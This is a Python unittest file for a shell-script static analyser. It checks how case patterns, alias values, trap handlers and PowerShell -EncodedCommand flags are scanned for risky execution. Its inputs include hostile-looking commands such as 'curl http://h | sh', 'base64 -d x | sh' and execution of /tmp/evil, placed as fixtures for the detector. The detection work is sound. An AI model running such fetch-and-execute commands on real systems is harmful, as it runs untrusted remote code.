"""Simple-command analysis: case patterns are data, `alias`/`trap` install code.

The whole-module mutation run of `shell_syntax` left a cluster of survivors in
`_pipelines`' case-statement grouping and in the `alias`, `trap` and
`powershell` arms of `command()`. Each test here exhibits the smallest input
whose finding set changes when the line is mutated; the margin names the site.

The through-line: a `case` pattern is data (an alternation `|` inside it is not
a pipeline, a temp path inside it is not an execution), while a branch *body*
is ordinary code, and `alias x=…` / `trap '…' SIG` install code that must be
analysed exactly once, at the right operand.
"""
from __future__ import annotations

import unittest

from falsicore.shell_syntax import analyze


class CasePatternsAreData(unittest.TestCase):
    def test_alternation_inside_a_pattern_is_not_a_pipeline(self):     # shell_syntax:386/395/396
        # Without the pattern state, the "|" alternation is read as a pipe and the
        # second alternative becomes an executed command head — a false positive.
        self.assertEqual(analyze("case $x in a|/tmp/evil) true;; esac")["patterns"], [])
        self.assertEqual(analyze("case $x in curl|/tmp/evil) : ;; esac")["patterns"], [])
        self.assertEqual(analyze("case $x in /tmp/a) : ;; esac")["patterns"], [])

    def test_branch_bodies_are_analysed_as_commands(self):             # shell_syntax:395/400/402
        self.assertIn("TEMP_PATH_IN_EXECUTION", analyze("case $x in a) /tmp/evil;; esac")["patterns"])
        self.assertIn("TEMP_PATH_IN_EXECUTION", analyze("case $x in a) :;; b) /tmp/z;; esac")["patterns"])
        # Two statements in one branch body, separated by ";" not ";;".
        self.assertIn("REMOTE_SCRIPT_PIPELINE", analyze("case $x in a) :; curl http://h|sh;; esac")["patterns"])

    def test_esac_closes_the_construct(self):                          # shell_syntax:391/392
        self.assertIn("REMOTE_SCRIPT_PIPELINE", analyze("case $x in a) :;; esac\ncurl http://h|sh\n")["patterns"])

    def test_nested_case_keeps_each_level_separate(self):              # shell_syntax:388/396/402 (case_stack[-1], not [0])
        # The inner pattern must stay data even while an outer case is open; a
        # mutant that wrote the outer stack frame would mis-track the inner level.
        self.assertEqual(analyze("case $x in a) case $y in b|/tmp/evil) true;; esac;; esac")["patterns"], [])
        self.assertIn("TEMP_PATH_IN_EXECUTION",
                      analyze("case $x in a) case $y in b) /tmp/z;; esac;; esac")["patterns"])


class AliasInstallsCode(unittest.TestCase):
    def test_alias_value_after_the_first_equals_is_analysed(self):     # shell_syntax:568/570/571
        self.assertIn("REMOTE_SCRIPT_PIPELINE", analyze("alias ll='curl http://h | sh'")["patterns"])
        self.assertIn("TEMP_PATH_IN_EXECUTION", analyze("alias x=/tmp/evil")["patterns"])
        # A value that itself contains "=" must be kept whole (split on the FIRST "=" only).
        self.assertIn("REMOTE_SCRIPT_PIPELINE", analyze("alias g='x=1; curl http://h | sh'")["patterns"])

    def test_a_word_without_equals_installs_nothing(self):             # shell_syntax:570 guard
        self.assertEqual(analyze("alias -p")["patterns"], [])
        self.assertEqual(analyze("alias ll")["patterns"], [])

    def test_the_name_before_equals_is_not_analysed_as_code(self):     # shell_syntax:571 index ([1], not [0])
        # The alias name is not code; only the value is. A mutant taking [0]
        # would analyse "curl" (the name) as data and miss the value.
        self.assertEqual(analyze("alias curl=:")["patterns"], [])
        self.assertIn("BASE64_DECODE_EXECUTION_CONTEXT", analyze("alias d='base64 -d x | sh'")["patterns"])


class TrapInstallsCode(unittest.TestCase):
    def test_handler_is_analysed(self):                                # shell_syntax:579/584
        self.assertIn("REMOTE_SCRIPT_PIPELINE", analyze("trap 'curl http://h | sh' EXIT")["patterns"])
        self.assertIn("TEMP_PATH_IN_EXECUTION", analyze("trap /tmp/evil INT")["patterns"])

    def test_options_are_skipped_and_the_first_non_option_is_the_handler(self):   # shell_syntax:580/581/582/584
        # `trap -l` lists signals: no handler, nothing analysed.
        self.assertEqual(analyze("trap -l")["patterns"], [])
        self.assertEqual(analyze("trap -p")["patterns"], [])
        # The handler is the first non-option word; a later signal name is not re-analysed.
        self.assertEqual(analyze("trap ':' /tmp/not-a-handler")["patterns"], [])
        # An expanded handler is unresolved, not silently clean.
        self.assertEqual(analyze('trap "$CMD" INT')["limitations"], ["EXPANSION_NOT_RESOLVED"])


class PowershellEncodedCommand(unittest.TestCase):
    def test_encoded_command_flag_is_flagged_case_insensitively(self):  # shell_syntax:620/621
        self.assertIn("RISKY_EXECUTION_FLAG", analyze("powershell -EncodedCommand ZQBjAGgAbwA=")["patterns"])
        self.assertIn("RISKY_EXECUTION_FLAG", analyze("pwsh -encodedcommand ZQBj")["patterns"])
        self.assertEqual(analyze("powershell -File script.ps1")["patterns"], [])


if __name__ == "__main__":
    unittest.main()
